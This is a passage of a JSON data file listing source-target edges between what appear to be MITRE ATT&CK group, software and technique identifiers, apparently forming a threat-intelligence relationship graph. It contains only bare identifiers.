        },
        {
            "source": "G0093",
            "target": "S0110"
        },
        {
            "source": "S0106",
            "target": "T1570"
        },
        {
            "source": "S0106",
            "target": "T1059.003"
        },
        {
            "source": "S0106",
            "target": "T1070.004"
        },
        {
            "source": "S0106",
            "target": "T1105"
        },
        {
            "source": "S0106",
            "target": "T1083"
        },
        {
            "source": "S0106",
            "target": "T1082"
        },
        {
            "source": "G0093",
            "target": "S0106"
        },
        {
            "source": "S0100",
            "target": "T1016"
        },
        {
            "source": "G0093",
            "target": "S0100"
        },
        {
            "source": "G0093",
            "target": "S0097"
        },
        {
            "source": "S0075",
            "target": "T1552.002"
        },
        {
            "source": "S0075",
            "target": "T1112"
        },
        {
            "source": "S0075",
            "target": "T1012"
        },
        {
            "source": "G0093",
            "target": "S0075"
        },
        {
            "source": "S0040",
            "target": "T1090"
        },
        {
            "source": "S0040",
            "target": "T1055"
        },
        {
            "source": "S0040",
            "target": "T1014"
        },
        {
            "source": "G0093",
            "target": "S0040"
        },
        {
            "source": "G0093",
            "target": "S0039"
        },
        {
            "source": "G0093",
            "target": "S0029"
        },
        {
            "source": "G0093",
            "target": "S0020"
        },
        {
            "source": "G0093",
            "target": "S0013"
        },
        {
            "source": "G0093",
            "target": "S0012"
        },
        {
            "source": "S0005",
            "target": "T1003.001"
        },
        {
            "source": "G0093",
            "target": "S0005"
        },
        {
            "source": "G0093",
            "target": "S0002"
        },
        {
            "source": "S0461",
            "target": "T1059.003"
        },
        {
            "source": "S0461",
            "target": "T1021.001"
        },
        {
            "source": "S0461",
            "target": "T1027.002"
        },
        {
            "source": "S0461",
            "target": "T1070.004"
        },
        {
            "source": "S0461",
            "target": "T1546.012"
        },
        {
            "source": "S0461",
            "target": "T1546.011"
        },
        {
            "source": "S0461",
            "target": "T1547.001"
        },
        {
            "source": "S0461",
            "target": "T1055.001"
        },
        {
            "source": "S0461",
            "target": "T1140"
        },
        {
            "source": "S0461",
            "target": "T1125"
        },
        {
            "source": "S0461",
            "target": "T1105"
        },
        {
            "source": "S0461",
            "target": "T1095"
        },
        {
            "source": "S0461",
            "target": "T1090"
        },
        {
            "source": "S0461",
            "target": "T1083"
        },
        {
            "source": "S0461",
            "target": "T1082"
        },
        {
            "source": "S0461",
            "target": "T1070"
        },
        {
            "source": "S0461",
            "target": "T1033"
        },
        {
            "source": "S0461",
            "target": "T1027"
        },
        {
            "source": "S0461",
            "target": "T1016"
        },
        {
            "source": "S0461",
            "target": "T1005"
        },
        {
            "source": "G0092",
            "target": "S0461"
        },
        {
            "source": "S0460",
            "target": "T1071.001"
        },
        {
            "source": "S0460",
            "target": "T1055.001"
        },
        {
            "source": "S0460",
            "target": "T1082"
        },
        {
            "source": "S0460",
            "target": "T1059"
        },
        {
            "source": "S0460",
            "target": "T1057"
        },
        {
            "source": "S0460",
            "target": "T1033"
        },
        {
            "source": "G0092",
            "target": "S0460"
        },
        {
            "source": "G0092",
            "target": "S0384"
        },
        {
            "source": "S0383",
            "target": "T1094"
        },
        {
            "source": "S0383",
            "target": "T1043"
        },
        {
            "source": "S0383",
            "target": "T1027"
        },
        {
            "source": "G0092",
            "target": "S0383"
        },
        {
            "source": "S0382",
            "target": "T1573.002"
        },
        {
            "source": "S0382",
            "target": "T1071.001"
        },
        {
            "source": "S0382",
            "target": "T1059.003"
        },
        {
            "source": "S0382",
            "target": "T1059.001"
        },
        {
            "source": "S0382",
            "target": "T1021.001"
        },
        {
            "source": "S0382",
            "target": "T1070.004"
        },
        {
            "source": "S0382",
            "target": "T1136.001"
        },
        {
            "source": "S0382",
            "target": "T1547.001"
        },
        {
            "source": "S0382",
            "target": "T1218.011"
        },
        {
            "source": "S0382",
            "target": "T1053.005"
        },
        {
            "source": "S0382",
            "target": "T1105"
        },
        {
            "source": "S0382",
            "target": "T1082"
        },
        {
            "source": "S0382",
            "target": "T1043"
        },
        {
            "source": "S0382",
            "target": "T1033"
        },
        {
            "source": "G0092",
            "target": "S0382"
        },
        {
            "source": "S0381",
            "target": "T1573.001"
        },
        {
            "source": "S0381",
            "target": "T1071.001"
        },
        {
            "source": "S0381",
            "target": "T1069.001"
        },
        {
            "source": "S0381",
            "target": "T1518.001"
        },
        {
            "source": "S0381",
            "target": "T1120"
        },
        {
            "source": "S0381",
            "target": "T1082"
        },
        {
            "source": "S0381",
            "target": "T1047"
        },
        {
            "source": "S0381",
            "target": "T1043"
        },
        {
            "source": "S0381",
            "target": "T1033"
        },
        {
            "source": "S0381",
            "target": "T1001"
        },
        {
            "source": "G0092",
            "target": "S0381"
        },
        {
            "source": "G0092",
            "target": "S0266"
        },
        {
            "source": "G0092",
            "target": "S0039"
        },
        {
            "source": "G0091",
            "target": "S0363"
        },
        {
            "source": "S0195",
            "target": "T1070.004"
        },
        {
            "source": "S0195",
            "target": "T1485"
        },
        {
            "source": "G0091",
            "target": "S0195"
        },
        {
            "source": "G0091",
            "target": "S0191"
        },
        {
            "source": "G0090",
            "target": "S0363"
        },
        {
            "source": "S0379",
            "target": "T1132.001"
        },
        {
            "source": "S0379",
            "target": "T1102.002"
        },
        {
            "source": "S0379",
            "target": "T1059.003"
        },
        {
            "source": "S0379",
            "target": "T1059.001"
        },
        {
            "source": "S0379",
            "target": "T1056.001"
        },
        {
            "source": "S0379",
            "target": "T1021.001"
        },
        {
            "source": "S0379",
            "target": "T1547.001"
        },
        {
            "source": "S0379",
            "target": "T1218.005"
        },
        {
            "source": "S0379",
            "target": "T1053.005"
        },
        {
            "source": "S0379",
            "target": "T1202"
        },
        {
            "source": "S0379",
            "target": "T1125"
        },
        {
            "source": "S0379",
            "target": "T1123"
        },
        {
            "source": "S0379",
            "target": "T1113"
        },
        {
            "source": "S0379",
            "target": "T1105"
        },
        {
            "source": "S0379",
            "target": "T1082"
        },
        {
            "source": "S0379",
            "target": "T1065"
        },
        {
            "source": "S0379",
            "target": "T1033"
        },
        {
            "source": "S0379",
            "target": "T1016"
        },
        {
            "source": "S0379",
            "target": "T1003"
        },
        {
            "source": "G0089",
            "target": "S0379"
        },
        {
            "source": "S0198",
            "target": "T1573.001"
        },
        {
            "source": "S0198",
            "target": "T1573"
        },
        {
            "source": "S0198",
            "target": "T1071.001"
        },
        {
            "source": "S0198",
            "target": "T1074.001"
        },
        {
            "source": "S0198",
            "target": "T1204.002"
        },
        {
            "source": "S0198",
            "target": "T1204.001"
        },
        {
            "source": "S0198",
            "target": "T1059.005"
        },
        {
            "source": "S0198",
            "target": "T1059.004"
        },
        {
            "source": "S0198",
            "target": "T1059.003"
        },
        {
            "source": "S0198",
            "target": "T1059.001"
        },
        {
            "source": "S0198",
            "target": "T1566.002"
        },
        {
            "source": "S0198",
            "target": "T1566.001"
        },
        {
            "source": "S0198",
            "target": "T1564.001"
        },
        {
            "source": "S0198",
            "target": "T1560.003"
        },
        {
            "source": "S0198",
            "target": "T1560"
        },
        {
            "source": "S0198",
            "target": "T1555.003"
        },
        {
            "source": "S0198",
            "target": "T1056.001"
        },
        {
            "source": "S0198",
            "target": "T1555"
        },
        {
            "source": "S0198",
            "target": "T1036.005"
        },
        {
            "source": "S0198",
            "target": "T1036.001"
        },
        {
            "source": "S0198",
            "target": "T1027.002"
        },
        {
            "source": "S0198",
            "target": "T1547.011"
        },
        {
            "source": "S0198",
            "target": "T1547.001"
        },
        {
            "source": "S0198",
            "target": "T1543.001"
        },
        {
            "source": "S0198",
            "target": "T1055.012"
        },
        {
            "source": "S0198",
            "target": "T1053.003"
        },
        {
            "source": "S0198",
            "target": "T1053.005"
        },
        {
            "source": "S0198",
            "target": "T1547.013"
        },
        {
            "source": "S0198",
            "target": "T1119"
        },
        {
            "source": "S0198",
            "target": "T1113"
        },
        {
            "source": "S0198",
            "target": "T1112"
        },
        {
            "source": "S0198",
            "target": "T1106"
        },
        {
            "source": "S0198",
            "target": "T1105"
        },
        {
            "source": "S0198",
            "target": "T1102"
        },
        {
            "source": "S0198",
            "target": "T1095"
        },
        {
            "source": "S0198",
            "target": "T1090"
        },
        {
            "source": "S0198",
            "target": "T1083"
        },
        {
            "source": "S0198",
            "target": "T1082"
        },
        {
            "source": "S0198",
            "target": "T1057"
        },
        {
            "source": "S0198",
            "target": "T1055"
        },
        {
            "source": "S0198",
            "target": "T1049"
        },
        {
            "source": "S0198",
            "target": "T1027"
        },
        {
            "source": "S0198",
            "target": "T1016"
        },
        {
            "source": "S0198",
            "target": "T1010"
        },
        {
            "source": "G0089",
            "target": "S0198"
        },
        {
            "source": "G0088",
            "target": "S0029"
        },
        {
            "source": "G0088",
            "target": "S0002"
        },
        {
            "source": "S1009",
            "target": "T0834"
        },
        {
            "source": "S1009",
            "target": "T0890"
        },
        {
            "source": "S1009",
            "target": "T0821"
        },
        {
            "source": "S1009",
            "target": "T0885"
        },
        {
            "source": "S1009",
            "target": "T0818"
        },
        {
            "source": "S1009",
            "target": "T0853"
        },
        {
            "source": "S1009",
            "target": "T0868"
        },
        {
            "source": "S1009",
            "target": "T0871"
        },
        {
            "source": "S1009",
            "target": "T0872"
        },
        {
            "source": "S1009",
            "target": "T0843"
        },
        {
            "source": "S1009",
            "target": "T0857"
        },
        {
            "source": "S1009",
            "target": "T0858"
        },
        {
            "source": "S1009",
            "target": "T0820"
        },
        {
            "source": "S1009",
            "target": "T0880"
        },
        {
            "source": "S1009",
            "target": "T0846"
        },
        {
            "source": "S1009",
            "target": "T0849"
        },
        {
            "source": "S1009",
            "target": "T0855"
        },
        {
            "source": "G0088",
            "target": "S1009"
        },
        {
            "source": "G0087",
            "target": "S0590"
        },
        {
            "source": "S0488",
            "target": "T1059.001"
        },
        {
            "source": "S0488",
            "target": "T1069.002"
        },
        {
            "source": "S0488",
            "target": "T1087.002"
        },
        {
            "source": "S0488",
            "target": "T1003.004"
        },
        {
            "source": "S0488",
            "target": "T1003.003"
        },
        {
            "source": "S0488",
            "target": "T1003.002"
        },
        {
            "source": "S0488",
            "target": "T1110.003"
        },
        {
            "source": "S0488",
            "target": "T1110.001"
        },
        {
            "source": "S0488",
            "target": "T1550.002"
        },
        {
            "source": "S0488",
            "target": "T1053.002"
        },
        {
            "source": "S0488",
            "target": "T1201"
        },
        {
            "source": "S0488",
            "target": "T1135"
        },
        {
            "source": "S0488",
            "target": "T1112"
        },
        {
            "source": "S0488",
            "target": "T1110"
        },
        {
            "source": "S0488",
            "target": "T1083"
        },
        {
            "source": "S0488",
            "target": "T1082"
        },
        {
            "source": "S0488",
            "target": "T1049"
        },
        {
            "source": "S0488",
            "target": "T1047"
        },
        {
            "source": "S0488",
            "target": "T1018"
        },
        {
            "source": "S0488",
            "target": "T1016"
        },
        {
            "source": "G0087",
            "target": "S0488"
        },
        {
            "source": "S0459",
            "target": "T1071.001"
        },
        {
            "source": "S0459",
            "target": "T1132.001"
        },
        {
            "source": "S0459",
            "target": "T1059.006"
        },
        {
            "source": "S0459",
            "target": "T1059.003"
        },
        {
            "source": "S0459",
            "target": "T1036.005"
        },
        {
            "source": "S0459",
            "target": "T1105"
        },
        {
            "source": "S0459",
            "target": "T1041"
        },
        {
            "source": "S0459",
            "target": "T1033"
        },
        {
            "source": "G0087",
            "target": "S0459"
        },
        {
            "source": "S0454",
            "target": "T1560"
        },
        {
            "source": "S0454",
            "target": "T1056.001"
        },
        {
            "source": "S0454",
            "target": "T1123"
        },
        {
            "source": "S0454",
            "target": "T1120"
        },
        {
            "source": "S0454",
            "target": "T1115"
        },
        {
            "source": "S0454",
            "target": "T1113"
        },
        {
            "source": "S0454",
            "target": "T1082"
        },
        {
            "source": "S0454",
            "target": "T1010"
        },
        {
            "source": "G0087",
            "target": "S0454"
        },
        {
            "source": "S0375",
            "target": "T1071.001"
        },
        {
            "source": "S0375",
            "target": "T1059.005"
        },
        {
            "source": "S0375",
            "target": "T1059.003"
        },
        {
            "source": "S0375",
            "target": "T1560"
        },
        {
            "source": "S0375",
            "target": "T1056.001"
        },
        {
            "source": "S0375",
            "target": "T1547.004"
        },
        {
            "source": "S0375",
            "target": "T1547.001"
        },
        {
            "source": "S0375",
            "target": "T1053.005"
        },
        {
            "source": "S0375",
            "target": "T1140"
        },
        {
            "source": "S0375",
            "target": "T1115"
        },
        {
            "source": "S0375",
            "target": "T1113"
        },
        {
            "source": "S0375",
            "target": "T1083"
        },
        {
            "source": "S0375",
            "target": "T1047"
        },
        {
            "source": "S0375",
            "target": "T1041"
        },
        {
            "source": "S0375",
            "target": "T1027"
        },
        {
            "source": "S0375",
            "target": "T1010"
        },
        {
            "source": "G0087",
            "target": "S0375"
        },
        {
            "source": "G0087",
            "target": "S0095"
        },
        {
            "source": "G0087",
            "target": "S0073"
        },
        {
            "source": "G0087",
            "target": "S0029"
        },
        {
            "source": "G0087",
            "target": "S0006"
        },
        {
            "source": "G0087",
            "target": "S0005"
        },
        {
            "source": "G0087",
            "target": "S0002"
        },
        {
            "source": "G0086",
            "target": "S0029"
        },
        {
            "source": "G0086",
            "target": "S0002"
        },
        {
            "source": "S0447",
            "target": "T1071.001"
        },
        {
            "source": "S0447",
            "target": "T1204.002"
        },
        {
            "source": "S0447",
            "target": "T1564.001"
        },
        {
            "source": "S0447",
            "target": "T1555.003"
        },
        {
            "source": "S0447",
            "target": "T1056.001"
        },
        {
            "source": "S0447",
            "target": "T1555"
        },
        {
            "source": "S0447",
            "target": "T1027.002"
        },
        {
            "source": "S0447",
            "target": "T1055.012"
        },
        {
            "source": "S0447",
            "target": "T1082"
        },
        {
            "source": "S0447",
            "target": "T1041"
        },
        {
            "source": "S0447",
            "target": "T1033"
        },
        {
            "source": "S0447",
            "target": "T1027"
        },
        {
            "source": "S0447",
            "target": "T1016"
        },
        {
            "source": "G0083",
            "target": "S0447"
        },
        {
            "source": "S0336",
            "target": "T1573.001"
        },
        {
            "source": "S0336",
            "target": "T1059.005"
        },
        {
            "source": "S0336",
            "target": "T1059.003"
        },
        {
            "source": "S0336",
            "target": "T1562.004"
        },
        {
            "source": "S0336",
            "target": "T1562.001"
        },
        {
            "source": "S0336",
            "target": "T1056.001"
        },
        {
            "source": "S0336",
            "target": "T1547.001"
        },
        {
            "source": "S0336",
            "target": "T1125"
        },
        {
            "source": "S0336",
            "target": "T1123"
        },
        {
            "source": "S0336",
            "target": "T1112"
        },
        {
            "source": "S0336",
            "target": "T1105"
        },
        {
            "source": "S0336",
            "target": "T1065"
        },
        {
            "source": "S0336",
            "target": "T1027"
        },
        {
            "source": "S0336",
            "target": "T1016"
        },
        {
            "source": "G0083",
            "target": "S0336"
        },
        {
            "source": "S0334",
            "target": "T1071.001"
        },
        {
            "source": "S0334",
            "target": "T1059.003"
        },
        {
            "source": "S0334",
            "target": "T1562.004"
        },
        {
            "source": "S0334",
            "target": "T1562.001"
        },
        {
            "source": "S0334",
            "target": "T1056.001"
        },
        {
            "source": "S0334",
            "target": "T1021.001"
        },
        {
            "source": "S0334",
            "target": "T1036.005"
        },
        {
            "source": "S0334",
            "target": "T1027.002"
        },
        {
            "source": "S0334",
            "target": "T1547.001"
        },
        {
            "source": "S0334",
            "target": "T1125"
        },
        {
            "source": "S0334",
            "target": "T1123"
        },
        {
            "source": "S0334",
            "target": "T1115"
        },
        {
            "source": "S0334",
            "target": "T1112"
        },
        {
            "source": "S0334",
            "target": "T1105"
        },
        {
            "source": "S0334",
            "target": "T1082"
        },
        {
            "source": "S0334",
            "target": "T1059"
        },
        {
            "source": "S0334",
            "target": "T1057"
        },
        {
            "source": "S0334",
            "target": "T1033"
        },
        {
            "source": "G0083",
            "target": "S0334"
        },
        {
            "source": "S0331",
            "target": "T1071.003"
        },
        {
            "source": "S0331",
            "target": "T1071.001"
        },
        {
            "source": "S0331",
            "target": "T1048.003"
        },
        {
            "source": "S0331",
            "target": "T1564.003"
        },
        {
            "source": "S0331",
            "target": "T1204.002"
        },
        {
            "source": "S0331",
            "target": "T1566.001"
        },
        {
            "source": "S0331",
            "target": "T1564.001"
        },
        {
            "source": "S0331",
            "target": "T1087.001"
        },
        {
            "source": "S0331",
            "target": "T1562.001"
        },
        {
            "source": "S0331",
            "target": "T1560"
        },
        {
            "source": "S0331",
            "target": "T1555.003"
        },
        {
            "source": "S0331",
            "target": "T1056.001"
        },
        {
            "source": "S0331",
            "target": "T1555"
        },
        {
            "source": "S0331",
            "target": "T1552.002"
        },
        {
            "source": "S0331",
            "target": "T1552.001"
        },
        {
            "source": "S0331",
            "target": "T1547.001"
        },
        {
            "source": "S0331",
            "target": "T1218.009"
        },
        {
            "source": "S0331",
            "target": "T1055.012"
        },
        {
            "source": "S0331",
            "target": "T1053.005"
        },
        {
            "source": "S0331",
            "target": "T1497"
        },
        {
            "source": "S0331",
            "target": "T1203"
        },
        {
            "source": "S0331",
            "target": "T1185"
        },
        {
            "source": "S0331",
            "target": "T1140"
        },
        {
            "source": "S0331",
            "target": "T1125"
        },
        {
            "source": "S0331",
            "target": "T1124"
        },
        {
            "source": "S0331",
            "target": "T1115"
        },
        {
            "source": "S0331",
            "target": "T1113"
        },
        {
            "source": "S0331",
            "target": "T1112"
        },
        {
            "source": "S0331",
            "target": "T1105"
        },
        {
            "source": "S0331",
            "target": "T1082"
        },
        {
            "source": "S0331",
            "target": "T1065"
        },
        {
            "source": "S0331",
            "target": "T1057"
        },
        {
            "source": "S0331",
            "target": "T1055"
        },
        {
            "source": "S0331",
            "target": "T1047"
        },
        {
            "source": "S0331",
            "target": "T1033"
        },
        {
            "source": "S0331",
            "target": "T1027"
        },
        {
            "source": "S0331",
            "target": "T1016"
        },
        {
            "source": "G0083",
            "target": "S0331"
        },
        {
            "source": "G0083",
            "target": "S0198"
        },
        {
            "source": "G0082",
            "target": "S0334"
        },
        {
            "source": "G0082",
            "target": "S0039"
        },
        {
            "source": "G0082",
            "target": "S0002"
        },
        {
            "source": "G0081",
            "target": "S0596"
        },
        {
            "source": "S0452",
            "target": "T1059.003"
        },
        {
            "source": "S0452",
            "target": "T1087.001"
        },
        {
            "source": "S0452",
            "target": "T1218.011"
        },
        {
            "source": "S0452",
            "target": "T1120"
        },
        {
            "source": "S0452",
            "target": "T1091"
        },
        {
            "source": "S0452",
            "target": "T1083"
        },
        {
            "source": "S0452",
            "target": "T1057"
        },
        {
            "source": "S0452",
            "target": "T1049"
        },
        {
            "source": "S0452",
            "target": "T1018"
        },
        {
            "source": "S0452",
            "target": "T1016"
        },
        {
            "source": "S0452",
            "target": "T1005"
        },
        {
            "source": "G0081",
            "target": "S0452"
        },
        {
            "source": "S0388",
            "target": "T1071.001"
        },
        {
            "source": "S0388",
            "target": "T1518.001"
        },
        {
            "source": "S0388",
            "target": "T1140"
        },
        {
            "source": "S0388",
            "target": "T1105"
        },
        {
            "source": "S0388",
            "target": "T1082"
        },
        {
            "source": "S0388",
            "target": "T1027"
        },
        {
            "source": "G0081",
            "target": "S0388"
        },
        {
            "source": "S0387",
            "target": "T1001.003"
        },
        {
            "source": "S0387",
            "target": "T1564.003"
        },
        {
            "source": "S0387",
            "target": "T1059.006"
        },
        {
            "source": "S0387",
            "target": "T1059.005"
        },
        {
            "source": "S0387",
            "target": "T1059.003"
        },
        {
            "source": "S0387",
            "target": "T1059.001"
        },
        {
            "source": "S0387",
            "target": "T1555.003"
        },
        {
            "source": "S0387",
            "target": "T1559.002"
        },
        {
            "source": "S0387",
            "target": "T1056.001"
        },
        {
            "source": "S0387",
            "target": "T1070.006"
        },
        {
            "source": "S0387",
            "target": "T1547.004"
        },
        {
            "source": "S0387",
            "target": "T1543.003"
        },
        {
            "source": "S0387",
            "target": "T1113"
        },
        {
            "source": "S0387",
            "target": "T1105"
        },
        {
            "source": "S0387",
            "target": "T1083"
        },
        {
            "source": "S0387",
            "target": "T1082"
        },
        {
            "source": "S0387",
            "target": "T1043"
        },
        {
            "source": "S0387",
            "target": "T1027"
        },
        {
            "source": "S0387",
            "target": "T1016"
        },
        {
            "source": "G0081",
            "target": "S0387"
        },
        {
            "source": "G0081",
            "target": "S0190"
        },
        {
            "source": "G0081",
            "target": "S0012"
        },
        {
            "source": "G0073",
            "target": "S0363"
        },
        {
            "source": "G0073",
            "target": "S0154"
        },
        {
            "source": "S0500",
            "target": "T1071.001"
        },
        {
            "source": "S0500",
            "target": "T1564.003"
        },
        {
            "source": "S0500",
            "target": "T1059.003"
        },
        {
            "source": "S0500",
            "target": "T1036.005"
        },
        {
            "source": "S0500",
            "target": "T1547.001"
        },
        {
            "source": "S0500",
            "target": "T1053.005"
        },
        {
            "source": "S0500",
            "target": "T1105"
        },
        {
            "source": "S0500",
            "target": "T1070"
        },
        {
            "source": "S0500",
            "target": "T1027"
        },
        {
            "source": "S0500",
            "target": "T1005"
        },
        {
            "source": "G0074",
            "target": "S0500"
        },
        {
            "source": "G0074",
            "target": "S0488"
        },
        {
            "source": "G0074",
            "target": "S0357"
        },
        {
            "source": "S0108",
            "target": "T1518.001"
        },
        {
            "source": "S0108",
            "target": "T1562.004"
        },
        {
            "source": "S0108",
            "target": "T1546.007"
        },
        {
            "source": "S0108",
            "target": "T1090"
        },
        {
            "source": "G0074",
            "target": "S0108"
        },
        {
            "source": "S0094",
            "target": "T1573.002"
        },
        {
            "source": "S0094",
            "target": "T1071.001"
        },
        {
            "source": "S0094",
            "target": "T1074.001"
        },
        {
            "source": "S0094",
            "target": "T1059.003"
        },
        {
            "source": "S0094",
            "target": "T1497.001"
        },
        {
            "source": "S0094",
            "target": "T1555.003"
        },
        {
            "source": "S0094",
            "target": "T1056.001"
        },
        {
            "source": "S0094",
            "target": "T1027.002"
        },
        {
            "source": "S0094",
            "target": "T1070.004"
        },
        {
            "source": "S0094",
            "target": "T1547.001"
        },
        {
            "source": "S0094",
            "target": "T1055.003"
        },
        {
            "source": "S0094",
            "target": "T1113"
        },
        {
            "source": "S0094",
            "target": "T1105"
        },
        {
            "source": "S0094",
            "target": "T1083"
        },
        {
            "source": "S0094",
            "target": "T1082"
        },
        {
            "source": "S0094",
            "target": "T1057"
        },
        {
            "source": "S0094",
            "target": "T1049"
        },
        {
            "source": "S0094",
            "target": "T1033"
        },
        {
            "source": "S0094",
            "target": "T1027"
        },
        {
            "source": "S0094",
            "target": "T1016"
        },
        {
            "source": "S0094",
            "target": "T1010"
        },
        {
            "source": "S0094",
            "target": "T1003"
        },
        {
            "source": "G0074",
            "target": "S0094"
        },
        {
            "source": "G0074",
            "target": "S0075"
        },
        {
            "source": "G0074",
            "target": "S0039"
        },
        {
            "source": "G0074",
            "target": "S0029"
        },
        {
            "source": "G0080",
            "target": "S0284"
        },
        {
            "source": "G0080",
            "target": "S0195"
        },
        {
            "source": "G0080",
            "target": "S0154"
        },
        {
            "source": "G0080",
            "target": "S0029"
        },
        {
            "source": "G0080",
            "target": "S0002"
        },
        {
            "source": "G0072",
            "target": "S0106"
        },
        {
            "source": "S0096",
            "target": "T1082"
        },
        {
            "source": "G0072",
            "target": "S0096"
        },
        {
            "source": "G0072",
            "target": "S0075"
        },
        {
            "source": "S0057",
            "target": "T1518.001"
        },
        {
            "source": "S0057",
            "target": "T1057"
        },
        {
            "source": "S0057",
            "target": "T1007"
        },
        {
            "source": "G0072",
            "target": "S0057"
        },
        {
            "source": "S0254",
            "target": "T1573.001"
        },
        {
            "source": "S0254",
            "target": "T1059.003"
        },
        {
            "source": "S0254",
            "target": "T1548.002"
        },
        {
            "source": "S0254",
            "target": "T1547.001"
        },
        {
            "source": "S0254",
            "target": "T1112"
        },
        {
            "source": "S0254",
            "target": "T1105"
        },
        {
            "source": "S0254",
            "target": "T1094"
        },
        {
            "source": "S0254",
            "target": "T1082"
        },
        {
            "source": "S0254",
            "target": "T1057"
        },
        {
            "source": "S0254",
            "target": "T1016"
        },
        {
            "source": "G0075",
            "target": "S0254"
        },
        {
            "source": "S0255",
            "target": "T1218.011"
        },
        {
            "source": "S0255",
            "target": "T1140"
        },
        {
            "source": "S0255",
            "target": "T1105"
        },
        {
            "source": "S0255",
            "target": "T1094"
        },
        {
            "source": "S0255",
            "target": "T1083"
        },
        {
            "source": "G0075",
            "target": "S0255"
        },
        {
            "source": "G0075",
            "target": "S0160"
        },
        {
            "source": "G0075",
            "target": "S0075"
        },
        {
            "source": "S0234",
            "target": "T1059.003"
        },
        {
            "source": "S0234",
            "target": "T1056.001"
        },
        {
            "source": "S0234",
            "target": "T1055.012"
        },
        {
            "source": "S0234",
            "target": "T1125"
        },
        {
            "source": "S0234",
            "target": "T1123"
        },
        {
            "source": "S0234",
            "target": "T1113"
        },
        {
            "source": "G0070",
            "target": "S0234"
        },
        {
            "source": "S0235",
            "target": "T1547.001"
        },
        {
            "source": "S0235",
            "target": "T1543.001"
        },
        {
            "source": "S0235",
            "target": "T1113"
        },
        {
            "source": "S0235",
            "target": "T1083"
        },
        {
            "source": "G0070",
            "target": "S0235"
        },
        {
            "source": "S0182",
            "target": "T1574.002"
        },
        {
            "source": "S0182",
            "target": "T1574.001"
        },
        {
            "source": "S0182",
            "target": "T1497.001"
        },
        {
            "source": "S0182",
            "target": "T1518.001"
        },
        {
            "source": "S0182",
            "target": "T1134.001"
        },
        {
            "source": "S0182",
            "target": "T1056.004"
        },
        {
            "source": "S0182",
            "target": "T1036.005"
        },
        {
            "source": "S0182",
            "target": "T1027.002"
        },
        {
            "source": "S0182",
            "target": "T1027.001"
        },
        {
            "source": "S0182",
            "target": "T1548.002"
        },
        {
            "source": "S0182",
            "target": "T1070.001"
        },
        {
            "source": "S0182",
            "target": "T1547.001"
        },
        {
            "source": "S0182",
            "target": "T1543.003"
        },
        {
            "source": "S0182",
            "target": "T1055.001"
        },
        {
            "source": "S0182",
            "target": "T1542.003"
        },
        {
            "source": "S0182",
            "target": "T1140"
        },
        {
            "source": "S0182",
            "target": "T1113"
        },
        {
            "source": "S0182",
            "target": "T1083"
        },
        {
            "source": "S0182",
            "target": "T1082"
        },
        {
            "source": "S0182",
            "target": "T1057"
        },
        {
            "source": "S0182",
            "target": "T1027"
        },
        {
            "source": "S0182",
            "target": "T1012"
        },
        {
            "source": "S0182",
            "target": "T1404"
        },
        {
            "source": "S0182",
            "target": "T1436"
        },
        {
            "source": "S0182",
            "target": "T1412"
        },
        {
            "source": "S0182",
            "target": "T1429"
        },
        {
            "source": "S0182",
            "target": "T1430"
        },
        {
            "source": "S0182",
            "target": "T1433"
        },
        {
            "source": "G0070",
            "target": "S0182"
        },
        {
            "source": "S0399",
            "target": "T1512"
        },
        {
            "source": "S0399",
            "target": "T1507"
        },
        {
            "source": "S0399",
            "target": "T1476"
        },
        {
            "source": "S0399",
            "target": "T1411"
        },
        {
            "source": "S0399",
            "target": "T1437"
        },
        {
            "source": "S0399",
            "target": "T1406"
        },
        {
            "source": "S0399",
            "target": "T1447"
        },
        {
            "source": "S0399",
            "target": "T1418"
        },
        {
            "source": "S0399",
            "target": "T1426"
        },
        {
            "source": "S0399",
            "target": "T1412"
        },
        {
            "source": "S0399",
            "target": "T1409"
        },
        {
            "source": "S0399",
            "target": "T1429"
        },
        {
            "source": "S0399",
            "target": "T1430"
        },
        {
            "source": "S0399",
            "target": "T1432"
        },
        {
            "source": "S0399",
            "target": "T1433"
        },
        {
            "source": "G0070",
            "target": "S0399"
        },
        {
            "source": "G0070",
            "target": "S0182"
        },
        {
            "source": "G0078",
            "target": "S0385"
        },
        {
            "source": "G0078",
            "target": "S0336"
        },
        {
            "source": "S0332",
            "target": "T1059.006"
        },
        {
            "source": "S0332",
            "target": "T1059.003"
        },
        {
            "source": "S0332",
            "target": "T1497.001"
        },
        {
            "source": "S0332",
            "target": "T1056.001"
        },
        {
            "source": "S0332",
            "target": "T1548.002"
        },
        {
            "source": "S0332",
            "target": "T1547.001"
        },
        {
            "source": "S0332",
            "target": "T1125"
        },
        {
            "source": "S0332",
            "target": "T1123"
        },
        {
            "source": "S0332",
            "target": "T1115"
        },
        {
            "source": "S0332",
            "target": "T1113"
        },
        {
            "source": "S0332",
            "target": "T1112"
        },
        {
            "source": "S0332",
            "target": "T1105"
        },
        {
            "source": "S0332",
            "target": "T1090"
        },
        {
            "source": "S0332",
            "target": "T1083"
        },
        {
            "source": "S0332",
            "target": "T1055"
        },
        {
            "source": "S0332",
            "target": "T1027"
        },
        {
            "source": "G0078",
            "target": "S0332"
        },
        {
            "source": "S0262",
            "target": "T1573.001"
        },
        {
            "source": "S0262",
            "target": "T1059.003"
        },
        {
            "source": "S0262",
            "target": "T1555.003"
        },
        {
            "source": "S0262",
            "target": "T1056.001"
        },
        {
            "source": "S0262",
            "target": "T1555"
        },
        {
            "source": "S0262",
            "target": "T1021.001"
        },
        {
            "source": "S0262",
            "target": "T1553.002"
        },
        {
            "source": "S0262",
            "target": "T1552.001"
        },
        {
            "source": "S0262",
            "target": "T1053.005"
        },
        {
            "source": "S0262",
            "target": "T1125"
        },
        {
            "source": "S0262",
            "target": "T1112"
        },
        {
            "source": "S0262",
            "target": "T1105"
        },
        {
            "source": "S0262",
            "target": "T1090"
        },
        {
            "source": "S0262",
            "target": "T1082"
        },
        {
            "source": "G0078",
            "target": "S0262"
        },
        {
            "source": "S0413",
            "target": "T1087.003"
        },
        {
            "source": "S0413",
            "target": "T1114.002"
        },
        {
            "source": "S0413",
            "target": "T1110.003"
        },
        {
            "source": "G0077",
            "target": "S0413"
        },
        {
            "source": "G0077",
            "target": "S0349"
        },
        {
            "source": "G0077",
            "target": "S0029"
        },
        {
            "source": "G0077",
            "target": "S0002"
        },
        {
            "source": "S0270",
            "target": "T1132.001"
        },
        {
            "source": "S0270",
            "target": "T1102.002"
        },
        {
            "source": "S0270",
            "target": "T1059.003"
        },
        {
            "source": "S0270",
            "target": "T1059.001"
        },
        {
            "source": "S0270",
            "target": "T1497.001"
        },
        {
            "source": "S0270",
            "target": "T1518.001"
        },
        {
            "source": "S0270",
            "target": "T1547.009"
        },
        {
